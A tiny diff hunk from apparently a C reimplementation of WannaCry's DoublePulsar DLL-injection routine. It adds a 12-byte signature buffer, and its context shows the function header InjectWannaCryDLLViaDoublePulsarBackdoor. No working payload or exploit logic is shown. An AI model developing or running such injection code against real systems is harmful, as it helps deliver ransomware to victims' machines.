@@ -36,6 +36,7 @@ int v13;
 int v22 = 0;
 int i;
 int offset;
+unsigned char signature[12]; //dunno why Wannacry lists this variable with 9
 
 int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
 {
